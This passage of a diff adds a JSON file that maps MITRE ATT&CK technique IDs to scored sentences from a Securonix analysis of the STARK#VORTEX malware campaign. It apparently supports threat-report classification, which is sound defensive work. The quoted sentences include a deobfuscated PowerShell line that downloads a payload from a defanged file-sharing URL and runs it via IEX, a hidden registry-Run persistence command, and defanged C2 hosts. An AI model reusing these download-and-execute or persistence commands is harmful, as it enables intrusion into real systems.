+        "sentence": "27, 2023, updated Oct.",
+        "score": 0.3791
+      },
+      {
+        "sentence": "6, 2023 tldr: Securonix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.",
+        "score": 0.3847
+      },
+      {
+        "sentence": "New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.",
+        "score": 0.3394
+      },
+      {
+        "sentence": "Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.",
+        "score": 0.3639
+      },
+      {
+        "sentence": "The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”.",
+        "score": 0.3375
+      },
+      {
+        "sentence": "Microsoft help files are a typical file format which are used to provide application support, guides and references.",
+        "score": 0.3488
+      },
+      {
+        "sentence": "Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.",
+        "score": 0.41
+      },
+      {
+        "sentence": "The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware.",
+        "score": 0.3126
+      },
+      {
+        "sentence": "Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.",
+        "score": 0.5256
+      },
+      {
+        "sentence": "As we mentioned previously, the lure document was themed as a drone or UAV manual.",
+        "score": 0.3774
+      },
+      {
+        "sentence": "Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.",
+        "score": 0.3289
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.4002
+      },
+      {
+        "sentence": "Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags.",
+        "score": 0.3003
+      },
+      {
+        "sentence": "This time some key information such as C2 URL and payload names become visible.",
+        "score": 0.335
+      },
+      {
+        "sentence": "This is seen in the figure below.",
+        "score": 0.3135
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.3917
+      },
+      {
+        "sentence": "The script then downloads the file from the C2 server.",
+        "score": 0.3284
+      },
+      {
+        "sentence": "The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command: [System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”) The command is then executed using an invoke expression (IEX).",
+        "score": 0.348
+      },
+      {
+        "sentence": "Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below: Figure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.",
+        "score": 0.3047
+      },
+      {
+        "sentence": "Figure 9: Stage 3, deobfuscated PowerShell The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file.",
+        "score": 0.3048
+      },
+      {
+        "sentence": "Figure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework.",
+        "score": 0.3265
+      },
+      {
+        "sentence": "Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.",
+        "score": 0.501
+      },
+      {
+        "sentence": "The MerlinAgent framework is an open source C2 framework written in Go.",
+        "score": 0.4907
+      },
+      {
+        "sentence": "It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads.",
+        "score": 0.3138
+      },
+      {
+        "sentence": "MerlinAgent has a wide range of capabilities which include: - Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for: | Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash).",
+        "score": 0.4792
+      },
+      {
+        "sentence": "Upon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com.",
+        "score": 0.3533
+      },
+      {
+        "sentence": "It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”.",
+        "score": 0.3265
+      },
+      {
+        "sentence": "Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.",
+        "score": 0.4571
+      },
+      {
+        "sentence": "Typically receiving a Microsoft help file over the internet would be considered unusual.",
+        "score": 0.3647
+      },
+      {
+        "sentence": "C2 and infrastructure During the STARK#VORTEX campaign we observed the following network communication to C2 hosts.",
+        "score": 0.4808
+      },
+      {
+        "sentence": "Command and control from the MerlinAgent payload to the attacker’s C2 server used an encrypted channel over port 443.",
+        "score": 0.421
+      },
+      {
+        "sentence": "Request related details will be provided in Appendix A below. | C2 Address | Description | | catbox[.]moe | Executable file stager location.",
+        "score": 0.4433
+      },
+      {
+        "sentence": "Catbox is a legitimate file sharing service. | listen.servemp3[.]com 168.100.8[.]245 | Beacon C2 URL from ctlhost.exe | Securonix recommendations and mitigations Always be extra cautious downloading file attachments from posts for private messages.",
+        "score": 0.3696
+      },
+      {
+        "sentence": "Currently, it would appear that the threat actors have shifted to a new staging domain while many of the TTPs have remained the same.",
+        "score": 0.3271
+      },
+      {
+        "sentence": "This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game Minecraft.",
+        "score": 0.3895
+      },
+      {
+        "sentence": "It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads.",
+        "score": 0.4567
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.3221
+      },
+      {
+        "sentence": "The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net.",
+        "score": 0.3795
+      },
+      {
+        "sentence": "Why the attackers chose to masquerade as Minecraft is unclear, other than the fact that it is a wildly popular game.",
+        "score": 0.3515
+      },
+      {
+        "sentence": "This does speculate that it was probably not intended for business systems where games would normally not be found.",
+        "score": 0.3844
+      },
+      {
+        "sentence": "The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis.",
+        "score": 0.3707
+      },
+      {
+        "sentence": "Updated IoCs and Seeder hunting queries can be found below.",
+        "score": 0.312
+      }
+    ],
+    "T1218.001": [
+      {
+        "sentence": "25, 2023, updated Sept.",
+        "score": 0.3229
+      },
+      {
+        "sentence": "27, 2023, updated Oct.",
+        "score": 0.3434
+      },
+      {
+        "sentence": "6, 2023 tldr: Securonix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.",
+        "score": 0.6221
+      },
+      {
+        "sentence": "As the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down.",
+        "score": 0.3097
+      },
+      {
+        "sentence": "New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.",
+        "score": 0.4169
+      },
+      {
+        "sentence": "Since drones or unmanned aerial vehicles (UAVs) have been an integral tool used by the Ukrainian military, malware-laced lure files themed as UAVs service manuals have begun to surface.",
+        "score": 0.5126
+      },
+      {
+        "sentence": "Last month, the threat group tracked by the identifier UAC-0154 was identified using military-themed documents delivered via email to Ukrainian targets (@ukr.net).",
+        "score": 0.4541
+      },
+      {
+        "sentence": "Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.",
+        "score": 0.5147
+      },
+      {
+        "sentence": "Attack chain overview The lure file presents itself as a Microsoft Help file, or .chm file.",
+        "score": 0.6865
+      },
+      {
+        "sentence": "The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”.",
+        "score": 0.4761
+      },
+      {
+        "sentence": "Microsoft help files are a typical file format which are used to provide application support, guides and references.",
+        "score": 0.581
+      },
+      {
+        "sentence": "Code execution begins as soon as the user opens the document through a malicious JavaScript code block embedded inside one of the HTML pages.",
+        "score": 0.7124
+      },
+      {
+        "sentence": "Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.",
+        "score": 0.6468
+      },
+      {
+        "sentence": "The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware.",
+        "score": 0.5737
+      },
+      {
+        "sentence": "While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection.",
+        "score": 0.544
+      },
+      {
+        "sentence": "We’ll go over each stage in detail further down.",
+        "score": 0.3528
+      },
+      {
+        "sentence": "Initial code execution The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine.",
+        "score": 0.6309
+      },
+      {
+        "sentence": "Microsoft help files have been used maliciously in the past, though today they are less common as Microsoft stopped supporting the .chm file format in 2007.",
+        "score": 0.6308
+      },
+      {
+        "sentence": "They can, however, be opened and executed in modern Windows versions.",
+        "score": 0.5736
+      },
+      {
+        "sentence": "Help files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.",
+        "score": 0.6903
+      },
+      {
+        "sentence": "As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.",
+        "score": 0.4464
+      },
+      {
+        "sentence": "Figure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chm Code execution through a .chm file is a well known technique and there are several online tools available for building one.",
+        "score": 0.6976
+      },
+      {
+        "sentence": "It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.",
+        "score": 0.4002
+      },
+      {
+        "sentence": "As we mentioned previously, the lure document was themed as a drone or UAV manual.",
+        "score": 0.5069
+      },
+      {
+        "sentence": "Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.",
+        "score": 0.5013
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.7884
+      },
+      {
+        "sentence": "With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.",
+        "score": 0.6435
+      },
+      {
+        "sentence": "Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags.",
+        "score": 0.6274
+      },
+      {
+        "sentence": "Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.",
+        "score": 0.6306
+      },
+      {
+        "sentence": "Figure 4: Example of obfuscated JavaScript code found within page1.html PowerShell execution [] The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window.",
+        "score": 0.6
+      },
+      {
+        "sentence": "The PowerShell code is heavily obfuscated in order to evade detections.",
+        "score": 0.6166
+      },
+      {
+        "sentence": "Some obfuscation methods include Base64 encoding, GZIP compression, and char value substitutions.",
+        "score": 0.5753
+      },
+      {
+        "sentence": "Figure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm After deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code.",
+        "score": 0.6201
+      },
+      {
+        "sentence": "This time some key information such as C2 URL and payload names become visible.",
+        "score": 0.4411
+      },
+      {
+        "sentence": "This is seen in the figure below.",
+        "score": 0.4257
+      },
+      {
+        "sentence": "Next, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.",
+        "score": 0.5511
+      },
+      {
+        "sentence": "Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm With the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing.",
+        "score": 0.658
+      },
+      {
+        "sentence": "In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.",
+        "score": 0.5558
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.5431
+      },
+      {
+        "sentence": "The bulk of the code is stored inside the doS function which is called at the end of the script.",
+        "score": 0.4489
+      },
+      {
+        "sentence": "Next the script performs key functions: - Constructs the target path. - Checks if the executable file already exists at the defined path, returning -1 if it does. - Ensures that the necessary directory exists, creating it if needed. - Checks the success of directory creation, returning -2 if it fails.",
+        "score": 0.3408
+      },
+      {
+        "sentence": "The script then downloads the file from the C2 server.",
+        "score": 0.4004
+      },
+      {
+        "sentence": "The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command: [System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”) The command is then executed using an invoke expression (IEX).",
+        "score": 0.6196
+      },
+      {
+        "sentence": "Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below: Figure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.",
+        "score": 0.658
+      },
+      {
+        "sentence": "Compute the hash and fill the XOR mask - A SHA-256 hasher is initialized. - The input string $cryptPS is hashed to produce an array, $sha. - This hash is then used to populate the $xorMask array.",
+        "score": 0.5022
+      },
+      {
+        "sentence": "If the mask requires more bytes than the initial hash provides, the hash of the previous hash is used in a chained fashion until the mask is completely filled.",
+        "score": 0.4463
+      },
+      {
+        "sentence": "Note: The outer while($false) is odd since it renders the entire subsequent code block ineffective.",
+        "score": 0.4147
+      },
+      {
+        "sentence": "It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.",
+        "score": 0.5364
+      },
+      {
+        "sentence": "With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.",
+        "score": 0.5115
+      },
+      {
+        "sentence": "Figure 9: Stage 3, deobfuscated PowerShell The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file.",
+        "score": 0.6159
+      },
+      {
+        "sentence": "The last portion of the script then executes the original file in a few different ways.",
+        "score": 0.5373
+      },
+      {
+        "sentence": "The PowerShell script appears to be written with several options and configurations in mind, hence the $false while statement we mentioned earlier.",
+        "score": 0.3961
+      },
+      {
+        "sentence": "Also the existence of optional binary file arguments which were set to “null” in this case.",
+        "score": 0.4852
+      },
+      {
+        "sentence": "Binary file analysis The Windows binary file downloaded is a 64-bit executable at about 5MB in size.",
+        "score": 0.628
+      },
+      {
+        "sentence": "Some additional binary information is highlighted in figure 10 below.",
+        "score": 0.5335
+      },
+      {
+        "sentence": "Figure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework.",
+        "score": 0.6864
+      },
+      {
+        "sentence": "Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.",
+        "score": 0.319
+      },
+      {
+        "sentence": "The MerlinAgent framework is an open source C2 framework written in Go.",
+        "score": 0.3539
+      },
+      {
+        "sentence": "It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads.",
+        "score": 0.4265
+      },
+      {
+        "sentence": "Attackers can then distribute these payloads and incorporate them into their own malware stager or loader.",
+        "score": 0.4913
+      },
+      {
+        "sentence": "MerlinAgent has a wide range of capabilities which include: - Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for: | Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash).",
+        "score": 0.3755
+      },
+      {
+        "sentence": "It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”.",
+        "score": 0.4254
+      },
+      {
+        "sentence": "This will execute the binary file every time the user logs into the system.",
+        "score": 0.3601
+      },
+      {
+        "sentence": "Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.",
+        "score": 0.3201
+      },
+      {
+        "sentence": "Wrapping up… It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.",
+        "score": 0.5611
+      },
+      {
+        "sentence": "Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file.",
+        "score": 0.6576
+      },
+      {
+        "sentence": "Typically receiving a Microsoft help file over the internet would be considered unusual.",
+        "score": 0.4871
+      },
+      {
+        "sentence": "However, the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or file .",
+        "score": 0.5901
+      },
+      {
+        "sentence": "Command and control from the MerlinAgent payload to the attacker’s C2 server used an encrypted channel over port 443.",
+        "score": 0.3064
+      },
+      {
+        "sentence": "Request related details will be provided in Appendix A below. | C2 Address | Description | | catbox[.]moe | Executable file stager location.",
+        "score": 0.3963
+      },
+      {
+        "sentence": "Catbox is a legitimate file sharing service. | listen.servemp3[.]com 168.100.8[.]245 | Beacon C2 URL from ctlhost.exe | Securonix recommendations and mitigations Always be extra cautious downloading file attachments from posts for private messages.",
+        "score": 0.5288
+      },
+      {
+        "sentence": "29, 2023: The STARK#VORTEX attack campaign surges on as the Securonix Threat Research team continues to monitor the skies for changes and new vectors.",
+        "score": 0.3882
+      },
+      {
+        "sentence": "The naming scheme of the binary files has also changed.",
+        "score": 0.561
+      },
+      {
+        "sentence": "This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game Minecraft.",
+        "score": 0.506
+      },
+      {
+        "sentence": "It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads.",
+        "score": 0.3683
+      },
+      {
+        "sentence": "The lure document has also been retargeted.",
+        "score": 0.5529
+      },
+      {
+        "sentence": "As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign.",
+        "score": 0.6387
+      },
+      {
+        "sentence": "Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload.",
+        "score": 0.791
+      },
+      {
+        "sentence": "The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”.",
+        "score": 0.6037
+      },
+      {
+        "sentence": "When opened, the content of the lure file simply contains a few company logos.",
+        "score": 0.6196
+      },
+      {
+        "sentence": "Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.",
+        "score": 0.6005
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.6345
+      },
+      {
+        "sentence": "The encoded payload is decoded and then executed in almost the same fashion as we saw before.",
+        "score": 0.5552
+      },
+      {
+        "sentence": "The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net.",
+        "score": 0.4964
+      },
+      {
+        "sentence": "Why the attackers chose to masquerade as Minecraft is unclear, other than the fact that it is a wildly popular game.",
+        "score": 0.4001
+      },
+      {
+        "sentence": "This does speculate that it was probably not intended for business systems where games would normally not be found.",
+        "score": 0.4199
+      },
+      {
+        "sentence": "Wrapping up… Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week.",
+        "score": 0.4798
+      },
+      {
+        "sentence": "The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis.",
+        "score": 0.5013
+      },
+      {
+        "sentence": "Updated IoCs and Seeder hunting queries can be found below.",
+        "score": 0.3473
+      }
+    ],
+    "T1105": [
+      {
+        "sentence": "27, 2023, updated Oct.",
+        "score": 0.3104
+      },
+      {
+        "sentence": "6, 2023 tldr: Securonix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.",
+        "score": 0.5105
+      },
+      {
+        "sentence": "New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.",
+        "score": 0.3639
+      },
+      {
+        "sentence": "Last month, the threat group tracked by the identifier UAC-0154 was identified using military-themed documents delivered via email to Ukrainian targets (@ukr.net).",
+        "score": 0.3601
+      },
+      {
+        "sentence": "Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.",
+        "score": 0.4397
+      },
+      {
+        "sentence": "The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”.",
+        "score": 0.3114
+      },
+      {
+        "sentence": "Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.",
+        "score": 0.7007
+      },
+      {
+        "sentence": "The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware.",
+        "score": 0.4439
+      },
+      {
+        "sentence": "Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.",
+        "score": 0.4349
+      },
+      {
+        "sentence": "Initial code execution The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine.",
+        "score": 0.3392
+      },
+      {
+        "sentence": "They can, however, be opened and executed in modern Windows versions.",
+        "score": 0.3101
+      },
+      {
+        "sentence": "As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.",
+        "score": 0.3045
+      },
+      {
+        "sentence": "Figure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chm Code execution through a .chm file is a well known technique and there are several online tools available for building one.",
+        "score": 0.322
+      },
+      {
+        "sentence": "It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.",
+        "score": 0.3609
+      },
+      {
+        "sentence": "Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.",
+        "score": 0.4125
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.3836
+      },
+      {
+        "sentence": "With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.",
+        "score": 0.3555
+      },
+      {
+        "sentence": "Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags.",
+        "score": 0.3043
+      },
+      {
+        "sentence": "Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.",
+        "score": 0.4208
+      },
+      {
+        "sentence": "Figure 4: Example of obfuscated JavaScript code found within page1.html PowerShell execution [] The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window.",
+        "score": 0.366
+      },
+      {
+        "sentence": "The PowerShell code is heavily obfuscated in order to evade detections.",
+        "score": 0.3353
+      },
+      {
+        "sentence": "Figure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm After deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code.",
+        "score": 0.3737
+      },
+      {
+        "sentence": "This time some key information such as C2 URL and payload names become visible.",
+        "score": 0.5571
+      },
+      {
+        "sentence": "This is seen in the figure below.",
+        "score": 0.3026
+      },
+      {
+        "sentence": "Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm With the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing.",
+        "score": 0.3659
+      },
+      {
+        "sentence": "In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.",
+        "score": 0.6155
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.6715
+      },
+      {
+        "sentence": "Next the script performs key functions: - Constructs the target path. - Checks if the executable file already exists at the defined path, returning -1 if it does. - Ensures that the necessary directory exists, creating it if needed. - Checks the success of directory creation, returning -2 if it fails.",
+        "score": 0.338
+      },
+      {
+        "sentence": "The script then downloads the file from the C2 server.",
+        "score": 0.8013
+      },
+      {
+        "sentence": "The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command: [System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”) The command is then executed using an invoke expression (IEX).",
+        "score": 0.736
+      },
+      {
+        "sentence": "Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below: Figure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.",
+        "score": 0.4881
+      },
+      {
+        "sentence": "It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.",
+        "score": 0.3581
+      },
+      {
+        "sentence": "With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.",
+        "score": 0.3632
+      },
+      {
+        "sentence": "Figure 9: Stage 3, deobfuscated PowerShell The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file.",
+        "score": 0.487
+      },
+      {
+        "sentence": "The last portion of the script then executes the original file in a few different ways.",
+        "score": 0.358
+      },
+      {
+        "sentence": "Also the existence of optional binary file arguments which were set to “null” in this case.",
+        "score": 0.3206
+      },
+      {
+        "sentence": "Binary file analysis The Windows binary file downloaded is a 64-bit executable at about 5MB in size.",
+        "score": 0.5839
+      },
+      {
+        "sentence": "Some additional binary information is highlighted in figure 10 below.",
+        "score": 0.4064
+      },
+      {
+        "sentence": "Figure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework.",
+        "score": 0.4139
+      },
+      {
+        "sentence": "Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.",
+        "score": 0.4568
+      },
+      {
+        "sentence": "The MerlinAgent framework is an open source C2 framework written in Go.",
+        "score": 0.3817
+      },
+      {
+        "sentence": "It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads.",
+        "score": 0.523
+      },
+      {
+        "sentence": "Attackers can then distribute these payloads and incorporate them into their own malware stager or loader.",
+        "score": 0.6014
+      },
+      {
+        "sentence": "MerlinAgent has a wide range of capabilities which include: - Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for: | Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash).",
+        "score": 0.4477
+      },
+      {
+        "sentence": "Upon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com.",
+        "score": 0.3435
+      },
+      {
+        "sentence": "This will execute the binary file every time the user logs into the system.",
+        "score": 0.3633
+      },
+      {
+        "sentence": "Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.",
+        "score": 0.3822
+      },
+      {
+        "sentence": "Wrapping up… It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.",
+        "score": 0.3287
+      },
+      {
+        "sentence": "Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file.",
+        "score": 0.3514
+      },
+      {
+        "sentence": "Typically receiving a Microsoft help file over the internet would be considered unusual.",
+        "score": 0.4953
+      },
+      {
+        "sentence": "C2 and infrastructure During the STARK#VORTEX campaign we observed the following network communication to C2 hosts.",
+        "score": 0.3615
+      },
+      {
+        "sentence": "Command and control from the MerlinAgent payload to the attacker’s C2 server used an encrypted channel over port 443.",
+        "score": 0.3333
+      },
+      {
+        "sentence": "Request related details will be provided in Appendix A below. | C2 Address | Description | | catbox[.]moe | Executable file stager location.",
+        "score": 0.5159
+      },
+      {
+        "sentence": "Catbox is a legitimate file sharing service. | listen.servemp3[.]com 168.100.8[.]245 | Beacon C2 URL from ctlhost.exe | Securonix recommendations and mitigations Always be extra cautious downloading file attachments from posts for private messages.",
+        "score": 0.5643
+      },
+      {
+        "sentence": "29, 2023: The STARK#VORTEX attack campaign surges on as the Securonix Threat Research team continues to monitor the skies for changes and new vectors.",
+        "score": 0.3358
+      },
+      {
+        "sentence": "Currently, it would appear that the threat actors have shifted to a new staging domain while many of the TTPs have remained the same.",
+        "score": 0.318
+      },
+      {
+        "sentence": "The naming scheme of the binary files has also changed.",
+        "score": 0.3103
+      },
+      {
+        "sentence": "This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game Minecraft.",
+        "score": 0.333
+      },
+      {
